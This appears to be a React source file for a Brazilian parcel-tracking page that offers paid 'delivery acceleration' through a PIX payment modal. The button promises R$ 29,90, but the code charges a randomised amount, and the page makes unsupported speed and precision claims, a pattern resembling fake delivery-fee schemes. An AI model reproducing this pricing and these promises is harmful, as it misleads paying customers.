import React, { useState, useEffect } from 'react';
import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';

const API_BASE = import.meta.env.VITE_API_URL || '';

const TrackingPage: React.FC = () => {
    const [codigo, setCodigo] = useState('');
    const [trackingData, setTrackingData] = useState<any>(null);
    const [loading, setLoading] = useState(false);
    const [showExpressModal, setShowExpressModal] = useState(false);

    // PixGo Integration State
    const [pixLoading, setPixLoading] = useState(false);
    const [pixData, setPixData] = useState<any>(null);
    const [pixPaid, setPixPaid] = useState(false);

    useEffect(() => {
        let interval: any;
        if (pixData && !pixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.payment_id}`);
                    const json = await res.json();
                    if (json && json.success && json.data?.status === 'completed') {
                        setPixPaid(true);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [pixData, pixPaid]);
    useEffect(() => {

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('reveal-active');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.reveal').forEach(el => observer.observe(el));

        return () => {
            observer.disconnect();
        };
    }, []);

    const fetchTrackingData = async (searchCode: string) => {
        if (!searchCode) return;

        setLoading(true);
        setTrackingData(null);

        try {
            const apiBase = import.meta.env.VITE_API_URL || '';
            const res = await fetch(`${apiBase}/api/rastreio-publico`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ codigo: searchCode.toUpperCase() }),
            });
            const data = await res.json();

            if (res.ok && data.success) {
                // Mapear os dados do banco para o formato da UI
                const statusMap: any = {
                    'postado': <CheckCircle2 size={20} />,
                    'transito': <Package size={20} />,
                    'distribuicao': <MapPin size={20} />,
                    'entrega': <Truck size={20} />,
                    'saiu': <Truck size={20} />,
                    'entregue': <CheckCircle2 size={20} />
                };

                const mappedData = {
                    codigo: data.codigo,
                    status: data.statusAtual || 'Pendente',
                    previsao: 'Em breve',
                    eventos: ([...data.etapas].reverse()).map((e: any, i: number) => {
                        // Tentar encontrar o melhor ícone baseado no título ou slug
                        let icon = <Package size={20} />;
                        const titleLower = (e.titulo || '').toLowerCase();
                        if (titleLower.includes('postado')) icon = statusMap['postado'];
                        else if (titleLower.includes('transito')) icon = statusMap['transito'];
                        else if (titleLower.includes('distribuição') || titleLower.includes('distribuicao') || titleLower.includes('centro')) icon = statusMap['distribuicao'];
                        else if (titleLower.includes('saiu') || titleLower.includes('rota')) icon = statusMap['entrega'];
                        else if (titleLower.includes('entregue')) icon = statusMap['entregue'];

                        return {
                            id: i,
                            status: e.titulo,
                            local: data.cidade,
                            data: new Date(e.data).toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
                            detalhes: e.subtitulo || e.titulo,
                            icon: icon
                        };
                    }),
                    etapaAtual: data.etapas.length
                };
                setTrackingData(mappedData);
            } else {
                alert(data.message || 'Código não encontrado ou erro na busca.');
            }
        } catch (err) {
            console.error(err);
            alert('Erro ao buscar rastreio.');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        const hash = window.location.hash;
        const match = hash.match(/[?&]codigo=([^&]+)/);
        if (match && match[1]) {
            const urlCodigo = match[1].toUpperCase();
            setCodigo(urlCodigo);
            fetchTrackingData(urlCodigo);
        }
    }, []);

    const handleSearch = async (e: React.FormEvent) => {
        e.preventDefault();
        fetchTrackingData(codigo);
    };

    return (
        <div className="tr-page">
            <style>{`
                .tr-page { background: #06060b; color: #fff; min-height: 100vh; position: relative; overflow-x: hidden; font-family: 'Outfit', sans-serif; }
                .tr-page * { box-sizing: border-box; }
                .bg-mesh {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background:
                        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99, 102, 241, 0.15), transparent),
                        radial-gradient(ellipse 60% 40% at 80% 50%, rgba(168, 85, 247, 0.08), transparent),
                        radial-gradient(ellipse 50% 30% at 20% 80%, rgba(6, 182, 212, 0.06), transparent);
                }
                
                .reveal { opacity: 0; transform: translateY(30px) scale(0.95); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
                .reveal-active { opacity: 1; transform: translateY(0) scale(1); }

                .search-hero { padding: 120px 24px 60px; text-align: center; max-width: 800px; margin: 0 auto; position: relative; z-index: 1; }

                .search-box-premium {
                    max-width: 600px; margin: 0 auto;
                    background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
                    backdrop-filter: blur(20px); border-radius: 32px; padding: 12px;
                    display: flex; gap: 12px; align-items: center;
                }
                .search-input-premium { flex: 1; background: transparent; border: none; color: white; padding: 10px 20px; font-size: 1.1rem; outline: none; }
                .btn-track { padding: 14px 32px; background: linear-gradient(135deg, #6366f1, #a855f7); border: none; border-radius: 22px; color: white; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 10px; box-shadow: 0 8px 32px rgba(99, 102, 241, 0.4); white-space: nowrap; justify-content: center; }
                
                .tracking-container { max-width: 900px; margin: 0 auto 100px; padding: 0 24px; position: relative; z-index: 1; }
                .status-card { background: rgba(255,255,255,0.02); backdrop-filter: blur(32px); border: 1px solid rgba(255,255,255,0.08); border-radius: 40px; padding: 48px; margin-bottom: 40px; }
                .tl-item { display: flex; gap: 24px; margin-bottom: 32px; }
                .tl-point { width: 50px; height: 50px; border-radius: 16px; background: rgba(99, 102, 241, 0.1); display: flex; align-items: center; justify-content: center; color: #818cf8; flex-shrink: 0; position: relative; }
                .tl-line { position: absolute; top: 58px; left: 24px; width: 2px; height: calc(100% - 10px); background: rgba(255,255,255,0.05); }
                .tl-content { flex: 1; padding-bottom: 40px; }
                .tl-content h4 { font-size: 1.25rem; font-weight: 800; margin-bottom: 4px; }
                .tl-content p { color: rgba(255,255,255,0.4); line-height: 1.6; }
                
                .express-box { text-align: center; padding: 32px 0 0; margin-top: 32px; border-top: 2px dashed rgba(255,255,255,0.06); }
                .express-btn {
                    padding: 16px 40px; border: none; border-radius: 18px;
                    background: linear-gradient(135deg, #0096ff, #6366f1);
                    color: white; font-weight: 800; font-size: 1.05rem; cursor: pointer;
                    box-shadow: 0 8px 32px rgba(0, 150, 255, 0.3);
                    font-family: 'Outfit', sans-serif;
                    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                }
                .express-btn:hover { transform: translateY(-3px); box-shadow: 0 16px 48px rgba(0, 150, 255, 0.5); }
                
                @media (max-width: 768px) { .status-card { padding: 24px; } .search-box-premium { border-radius: 20px; flex-direction: column; padding: 20px; } .btn-track { width: 100%; } }

            `}</style>

            <div className="bg-mesh"></div>

            <Header />

            <section className="search-hero">
                <div className="reveal">
                    <h1 style={{ fontSize: 'clamp(2.5rem, 6vw, 4rem)', fontWeight: 900, marginBottom: '24px', letterSpacing: '-2px' }}>Onde está seu <span style={{ color: '#818cf8' }}>pacote?</span></h1>
                    <p style={{ color: 'rgba(255,255,255,0.4)', fontSize: '1.1rem', marginBottom: '48px' }}>Monitore sua entrega em tempo real com precisão de metros.</p>
                </div>

                <form onSubmit={handleSearch} className="search-box-premium reveal">
                    <Search size={24} color="#6366f1" />
                    <input type="text" className="search-input-premium" placeholder="Cole seu código de rastreio aqui..." value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} maxLength={30} />
                    <button type="submit" className="btn-track" disabled={loading}>
                        {loading ? 'Processando...' : 'Localizar'} <ArrowRight size={20} />
                    </button>
                </form>
            </section>

            <div className="tracking-container">
                {trackingData ? (
                    <div className="reveal">
                        <div className="status-card">
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '40px' }}>
                                <div>
                                    <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(52, 211, 153, 0.1)', border: '1px solid rgba(52, 211, 153, 0.2)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#34d399', marginBottom: '12px' }}>{trackingData.status}</div>
                                    <h2 style={{ fontSize: '1.8rem', fontWeight: 900 }}>{trackingData.codigo}</h2>
                                </div>
                                <div style={{ textAlign: 'right' }}>
                                    <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '0.8rem' }}>Previsão de Entrega</p>
                                    <p style={{ fontSize: '1.2rem', fontWeight: 800, color: '#818cf8' }}>{trackingData.previsao}</p>
                                </div>
                            </div>

                            <div style={{ display: 'flex', gap: '8px', marginBottom: '48px' }}>
                                {[1, 2, 3, 4].map(step => (
                                    <div key={step} style={{ flex: 1, height: '4px', background: step <= trackingData.etapaAtual ? '#818cf8' : 'rgba(255,255,255,0.05)', borderRadius: '2px', boxShadow: step === trackingData.etapaAtual ? '0 0 10px #818cf8' : 'none' }}></div>
                                ))}
                            </div>

                            <div className="timeline-list">
                                {trackingData.eventos.map((ev: any, i: number) => (
                                    <div key={i} className="tl-item">
                                        <div className="tl-point">
                                            {ev.icon}
                                            {i < trackingData.eventos.length - 1 && <div className="tl-line"></div>}
                                        </div>
                                        <div className="tl-content">
                                            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                                                <h4>{ev.status}</h4>
                                                <span style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700 }}>{ev.data}</span>
                                            </div>
                                            <p>{ev.detalhes}</p>
                                            <p style={{ fontSize: '0.8rem', marginTop: '4px' }}>📍 {ev.local}</p>
                                        </div>
                                    </div>
                                ))}
                            </div>

                            <div className="express-box">
                                <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                                <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '0.9rem', marginTop: '12px' }}>Receba seu pacote prioritariamente em até 3 dias.</p>
                            </div>
                        </div>

                        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center' }}>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}><Share2 size={16} /> Compartilhar</button>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}><Printer size={16} /> Imprimir</button>
                        </div>
                    </div>
                ) : (
                    <div style={{ textAlign: 'center', padding: '60px 0', opacity: 0.3 }} className="reveal">
                        <Package size={80} style={{ marginBottom: '24px' }} />
                        <p>Digite o seu código para ver a mágica acontecer.</p>
                    </div>
                )}
            </div>

            <Footer />

            {/* Modal Acelerar */}
            {showExpressModal && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Truck size={40} color="#6366f1" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                        </p>

                        {!pixData && !pixLoading && (
                            <button onClick={async () => {
                                setPixLoading(true);
                                try {
                                    const cents = Math.floor(Math.random() * 99);
                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento' })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setPixData(data.data);
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #6366f1, #a855f7)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(99, 102, 241, 0.3)' }}>
                                Pagar R$ 29,90 via PIX Agora
                            </button>
                        )}
                        {pixLoading && (
                            <div style={{ color: '#818cf8', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {pixData && !pixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                    {pixData.qr_code}
                                </div>
                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button onClick={() => { navigator.clipboard.writeText(pixData.qr_code); alert('Copiado!'); }} style={{ padding: '8px 16px', background: '#4f46e5', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem' }}>Copiar Código</button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {pixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Cancelar'}</button>
                    </div>
                </div>
            )}
        </div>
    );
};

export default TrackingPage;
